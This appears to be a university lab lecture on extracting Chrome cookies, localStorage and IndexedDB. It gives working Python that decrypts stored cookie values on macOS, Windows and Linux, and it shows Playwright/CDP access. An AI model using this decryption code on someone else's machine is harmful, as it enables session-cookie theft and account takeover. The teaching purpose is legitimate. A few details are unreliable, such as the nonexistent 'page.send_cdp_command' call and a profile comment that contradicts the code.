# Lecture 22b — External Access Lab: Python, SQLite, and CDP

| | |
|---|---|
| **Unit** | V — Networking & Storage |
| **Week** | 11 |
| **Duration** | 1.5 hours |
| **Format** | Lab session — students follow along on their own machines |

## Learning objectives

Students can:

1. Copy and read the Chrome cookie database with Python `sqlite3`.
2. Convert Chrome's Windows-epoch timestamps to Python `datetime` objects.
3. Explain why `encrypted_value` exists and describe the platform-specific encryption schemes.
4. Decrypt cookie values on macOS using `keyring` + PBKDF2 + AES-128-CBC.
5. Use Playwright to read cookies, localStorage, and IndexedDB from a running Chrome instance — the correct path when encryption or locking is a problem.
6. Enumerate origins using `chrome://quota-internals` data programmatically.

## Prerequisites

Students need before class:

```bash
pip install playwright cryptography keyring
playwright install chromium
```

Python 3.10+. On Windows, `pywin32` for DPAPI:

```bash
pip install pywin32
```

## Why you can't always just read the database (10 min)

Walk students through the three obstacles introduced in L22, now with solutions.

### Obstacle 1 — The exclusive lock

```python
import sqlite3
conn = sqlite3.connect('/home/user/.config/google-chrome/Default/Cookies')
# → sqlite3.OperationalError: database is locked
```

**Solution A**: close Chrome before connecting.

**Solution B**: copy the file first. SQLite's lock is on the file descriptor. Copying the file to `/tmp/` bypasses it:

```python
import shutil, os, sqlite3, tempfile

source = os.path.expanduser('~/.config/google-chrome/Default/Cookies')
tmp = tempfile.mktemp(suffix='.sqlite')
shutil.copy2(source, tmp)
conn = sqlite3.connect(tmp)
# read freely
conn.close()
os.unlink(tmp)
```

This is a snapshot — you're reading state from the moment of the copy. Live updates Chrome makes after the copy are not reflected.

**Solution C (preferred)**: use the Chrome DevTools Protocol (CDP) via Playwright. Reads cookies from the running browser with no lock issues. Covered later in this lecture.

### Obstacle 2 — The Windows-epoch timestamp

```python
>>> cursor.execute("SELECT creation_utc FROM cookies LIMIT 1").fetchone()
(13372063841234567,)
```

That's microseconds since January 1, 1601 (Windows FILETIME epoch), not Unix epoch (January 1, 1970). Convert:

```python
import datetime

EPOCH_DELTA_US = 11_644_473_600_000_000  # microseconds between 1601 and 1970

def chrome_ts_to_dt(ts: int) -> datetime.datetime:
    """Convert Chrome's Windows-epoch microseconds to UTC datetime."""
    if ts == 0:
        return None
    return datetime.datetime(1970, 1, 1, tzinfo=datetime.timezone.utc) \
           + datetime.timedelta(microseconds=ts - EPOCH_DELTA_US)
```

Test it:

```python
>>> chrome_ts_to_dt(13372063841234567)
datetime.datetime(2024, 7, 14, 12, 30, 41, 234567, tzinfo=datetime.timezone.utc)
```

### Obstacle 3 — Encrypted values

The `value` column is empty for most modern cookies. The real value is in `encrypted_value` as a binary blob. The encryption is platform-specific.

## Cookie encryption by platform (20 min)

This is the most platform-specific content in the course. Cover all three; students implement one for HW11.

### macOS encryption

**Algorithm**: AES-128-CBC.
**Key derivation**: PBKDF2-HMAC-SHA1.
**Parameters**: password from macOS Keychain service `"Chrome Safe Storage"`, salt `b"saltysalt"`, 1003 iterations, key length 16 bytes, IV = 16 space characters.
**Prefix**: encrypted values start with `b"v10"` (3 bytes). Strip before decrypting.

```python
import keyring
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def get_mac_key():
    password = keyring.get_password("Chrome Safe Storage", "Chrome")
    if not password:
        raise RuntimeError("Chrome key not found in Keychain")
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA1(),
        length=16,
        salt=b"saltysalt",
        iterations=1003,
        backend=default_backend()
    )
    return kdf.derive(password.encode("utf-8"))

def decrypt_mac(encrypted_value: bytes, key: bytes) -> str:
    if not encrypted_value.startswith(b"v10"):
        return encrypted_value.decode("utf-8", errors="replace")  # legacy plaintext
    ciphertext = encrypted_value[3:]  # strip "v10" prefix
    iv = b" " * 16  # 16 ASCII spaces
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(ciphertext) + decryptor.finalize()
    # PKCS7 unpadding
    pad_len = plaintext[-1]
    return plaintext[:-pad_len].decode("utf-8")

# Usage:
key = get_mac_key()
for row in cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies"):
    host, name, value, enc_val = row
    if enc_val:
        decoded = decrypt_mac(enc_val, key)
    else:
        decoded = value
    print(f"{host}  {name}  =  {decoded}")
```

### Windows encryption

**Algorithm**: Windows Data Protection API (DPAPI).
**Key**: tied to the current Windows user account — no extractable key. Only the logged-in user can decrypt.
**Modern Chrome (v80+)**: uses AES-256-GCM with a key encrypted via DPAPI stored in `Local State` JSON file, under `os_crypt.encrypted_key`. Prefix: `b"v10"` or `b"v11"`.

```python
# Windows only — requires pywin32
import win32crypt
import json, base64, os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def get_windows_key():
    local_state_path = os.path.join(
        os.environ["LOCALAPPDATA"],
        "Google", "Chrome", "User Data", "Local State"
    )
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(encrypted_key_b64)
    # Strip "DPAPI" prefix (first 5 bytes)
    encrypted_key = encrypted_key[5:]
    # Decrypt with DPAPI
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return key

def decrypt_windows(encrypted_value: bytes, key: bytes) -> str:
    if encrypted_value[:3] not in (b"v10", b"v11"):
        # Legacy DPAPI (older Chrome, no AES-GCM wrapping)
        try:
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
        except Exception:
            return ""
    # v10/v11: AES-256-GCM
    nonce = encrypted_value[3:3+12]   # 12-byte nonce after prefix
    ciphertext = encrypted_value[3+12:]
    aesgcm = AESGCM(key)
    return aesgcm.decrypt(nonce, ciphertext, None).decode("utf-8")
```

**Security note**: DPAPI ties the key to the Windows user account. This is more secure than macOS/Linux because there's no extractable raw key — decryption only works for the authenticated user on that machine. However, malware running as the same user can call DPAPI just as legitimately.

### Linux encryption

**Algorithm**: AES-128-CBC (same as macOS).
**Key derivation**: PBKDF2-HMAC-SHA1, same parameters as macOS.
**Password source**: `libsecret` (GNOME Keyring) or `KWallet`, service name `"Chrome Keys"`, account `"Chrome Safe Storage"`.
**Fallback**: if no keyring is available, Chrome uses the hardcoded password `"peanuts"`.

```python
# Linux
import secretstorage  # pip install secretstorage

def get_linux_key():
    bus = secretstorage.dbus_init()
    collection = secretstorage.get_default_collection(bus)
    items = list(collection.search_items({"application": "chrome"}))
    if items:
        password = items[0].get_secret()
    else:
        password = b"peanuts"  # fallback for headless/CI environments
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA1(), length=16,
        salt=b"saltysalt", iterations=1003, backend=default_backend()
    )
    return kdf.derive(password if isinstance(password, bytes) else password.encode())

def decrypt_linux(encrypted_value: bytes, key: bytes) -> str:
    # Same as macOS: strip "v10", AES-128-CBC, iv=16 spaces
    return decrypt_mac(encrypted_value, key)  # identical algorithm
```

### Summarize on the board

| Platform | Encryption | Key source | Extractable? |
|---|---|---|---|
| macOS | AES-128-CBC | macOS Keychain | Yes, if user is logged in |
| Windows (v80+) | AES-256-GCM | DPAPI-wrapped key in `Local State` | No raw key; DPAPI decryption only |
| Linux | AES-128-CBC | libsecret/KWallet or `"peanuts"` | Yes |

All prefixed with `v10` or `v11`. Older cookies (pre-encryption) have empty `encrypted_value` and plaintext `value`.

## Full Python cookie reader (10 min)

Put this complete, cross-platform script on the projector. This is the HW11 starting point.

```python
#!/usr/bin/env python3
"""chrome_cookies.py — read Chrome cookies from a database copy.
Close Chrome before running, or use --copy to snapshot first.
"""

import sys, os, shutil, sqlite3, tempfile, datetime, platform

EPOCH_DELTA_US = 11_644_473_600_000_000

def chrome_ts(ts):
    if not ts: return None
    return datetime.datetime(1970, 1, 1, tzinfo=datetime.timezone.utc) \
           + datetime.timedelta(microseconds=ts - EPOCH_DELTA_US)

def get_cookie_db():
    system = platform.system()
    if system == "Linux":
        return os.path.expanduser("~/.config/google-chrome/Default/Cookies")
    elif system == "Darwin":
        return os.path.expanduser(
            "~/Library/Application Support/Google/Chrome/Default/Cookies")
    elif system == "Windows":
        return os.path.join(os.environ["LOCALAPPDATA"],
            "Google", "Chrome", "User Data", "Default", "Cookies")
    raise RuntimeError(f"Unknown platform: {system}")

def read_cookies(db_path, host_filter=None):
    # Work on a copy so the exclusive lock doesn't bite us
    tmp = tempfile.mktemp(suffix=".sqlite")
    shutil.copy2(db_path, tmp)
    try:
        conn = sqlite3.connect(tmp)
        conn.row_factory = sqlite3.Row
        query = "SELECT * FROM cookies"
        params = ()
        if host_filter:
            query += " WHERE host_key LIKE ?"
            params = (f"%{host_filter}%",)
        query += " ORDER BY host_key, name"
        rows = conn.execute(query, params).fetchall()
        conn.close()
    finally:
        os.unlink(tmp)
    return rows

def decrypt(encrypted_value, value):
    """Attempt decryption. Returns plaintext or note about encrypted content."""
    if value:
        return value
    if not encrypted_value:
        return ""
    prefix = encrypted_value[:3]
    if prefix not in (b"v10", b"v11"):
        return f"<legacy encrypted, {len(encrypted_value)} bytes>"
    return f"<encrypted v{prefix[1:].decode()}, {len(encrypted_value)} bytes — see L22b for decryption>"

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else None
    db = get_cookie_db()
    print(f"Reading: {db}\n")
    cookies = read_cookies(db, host)
    print(f"Found {len(cookies)} cookies{f' for {host}' if host else ''}:\n")
    for c in cookies[:50]:  # limit output
        val = decrypt(bytes(c["encrypted_value"]) if c["encrypted_value"] else b"",
                      c["value"])
        exp = chrome_ts(c["expires_utc"])
        print(f"  {c['host_key']:40s}  {c['name']:30s}  {val[:30]}")
        print(f"    expires={exp}  secure={c['is_secure']}  httponly={c['is_httponly']}"
              f"  samesite={c['samesite']}  partition='{c['top_frame_site_key']}'")
```

Run it live. Show output. Show the `encrypted_value` note — then explain that decryption requires the platform-specific code from the sections above.

## The correct approach: Playwright CDP (20 min)

For production use, reading the raw database is fragile and platform-specific. The correct approach is to use **Chrome DevTools Protocol** via Playwright, which:
- Works while Chrome is running.
- Requires no file copying or encryption handling.
- Respects all Chrome's security model.
- Works for IndexedDB and localStorage too (not just cookies).

### Playwright cookie extraction

```python
from playwright.sync_api import sync_playwright

def get_cookies_via_playwright(url: str, cookie_filter=None):
    with sync_playwright() as p:
        # Launch with your real profile (read-only)
        browser = p.chromium.launch_persistent_context(
            user_data_dir="/tmp/playwright-profile",  # use a temp profile for safety
            headless=False
        )
        page = browser.new_page()
        page.goto(url)
        page.wait_for_load_state("networkidle")

        # Get all cookies for the current page
        cookies = browser.cookies()

        if cookie_filter:
            cookies = [c for c in cookies if cookie_filter in c["domain"]]

        for c in cookies:
            import datetime
            exp = datetime.datetime.fromtimestamp(c["expires"], tz=datetime.timezone.utc) \
                  if c["expires"] > 0 else None
            print(f"  {c['domain']:40s}  {c['name']:30s}  = {c['value'][:40]}")
            print(f"    expires={exp}  secure={c['secure']}  httpOnly={c['httpOnly']}"
                  f"  sameSite={c['sameSite']}")

        browser.close()
```

Notice: `value` is **already decrypted** — Playwright (via CDP) reads cookies from Chrome's in-memory `CookieMonster`, not from the encrypted database. You never see the encryption at all.

### Playwright localStorage extraction

```python
def get_local_storage(page, origin):
    """Read all localStorage for a given origin."""
    page.goto(origin)
    items = page.evaluate("""() => {
        const out = {};
        for (let i = 0; i < window.localStorage.length; i++) {
            const k = window.localStorage.key(i);
            out[k] = window.localStorage.getItem(k);
        }
        return out;
    }""")
    return items
```

### Playwright IndexedDB extraction

```python
def get_indexeddb_data(page, origin, db_name, store_name):
    """Read all records from an IndexedDB object store."""
    page.goto(origin)
    records = page.evaluate(f"""() => new Promise((resolve, reject) => {{
        const req = indexedDB.open('{db_name}');
        req.onsuccess = () => {{
            const db = req.result;
            const tx = db.transaction('{store_name}', 'readonly');
            const store = tx.objectStore('{store_name}');
            const all = store.getAll();
            all.onsuccess = () => resolve(all.result);
            all.onerror = () => reject(all.error);
        }};
        req.onerror = () => reject(req.error);
    }})""")
    return records
```

Run these live. Show cookies returned from a real site, localStorage from a page the class visits together, IndexedDB from a simple demo app.

### CDP directly (for advanced use)

If you want lower-level access, use the Chrome DevTools Protocol directly:

```python
# page.send_cdp_command is the raw CDP interface
cookies_raw = page.send_cdp_command("Network.getAllCookies")
for c in cookies_raw["cookies"]:
    print(c["domain"], c["name"], c["value"])

# Storage quotas
quota = page.send_cdp_command("Storage.getUsageAndQuota",
                               {"origin": "https://example.com"})
print(quota)
```

CDP methods are documented at [chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/) — a primary source.

## When to use each approach (5 min)

Put on the board:

| Situation | Approach |
|---|---|
| Chrome is closed; you want raw data | Copy file → `sqlite3` + decryption |
| Chrome is running; you want cookies | Playwright CDP (`browser.cookies()`) |
| You want IndexedDB from running Chrome | Playwright `page.evaluate(indexedDB...)` |
| Forensics / legal / Chrome is crashed | Copy file → `sqlite3` (encryption depends on OS) |
| Automated testing | Playwright throughout |
| Scientific lab instrument control | Playwright or CDP for live data |
| You want real-time observation | `chrome://net-export` or CDP event streams |

**For HW11**: students use the copy-and-read approach for the forensics questions (so they understand the format), and Playwright for the live extraction questions (so they understand the correct programmatic path).

## Lab exercise (10 min if time allows)

Have students run on their own machines:

```bash
python3 chrome_cookies.py google.com
```

And report: how many cookies? What are the `samesite` values? Any with `is_secure=0`?

Then spin up a Playwright script:

```python
from playwright.sync_api import sync_playwright
with sync_playwright() as p:
    b = p.chromium.launch_persistent_context("/tmp/pw", headless=False)
    page = b.new_page()
    page.goto("https://example.com")
    print(b.cookies())
    b.close()
```

## Reading for next unit

Unit V ends here. Midterm 2 is this Thursday. After the midterm:

- web.dev: [WebGPU article series](https://developer.chrome.com/docs/web-platform/webgpu)
- gpuweb.github.io: [WebGPU spec §3 (Fundamentals)](https://gpuweb.github.io/gpuweb/#fundamentals)
- webassembly.org: [WebAssembly overview](https://webassembly.org/getting-started/developers-guide/)

## Instructor notes

- This is a lab. If students don't have their laptop, they can pair with someone who does.
- **macOS students**: the Keychain access prompt will appear. Tell them to click "Allow" (or "Always Allow" for the session).
- **Windows students**: DPAPI decryption works silently if they're logged in as the same user.
- **Linux students**: if no keyring is configured, the `"peanuts"` fallback works fine for cookies Chrome set in that session.
- The Playwright section is the most useful practical outcome. If time is short, compress the encryption details and spend more time on Playwright.
- This lecture bridges Unit V to the course's practical/science computing themes. A ChemE student who knows Playwright can automate lab instrument web interfaces.

---

[← L22](./L22-storage-internals.md) · [Unit V README](./README.md) · **End of Unit V** · Next: Unit VI coming soon
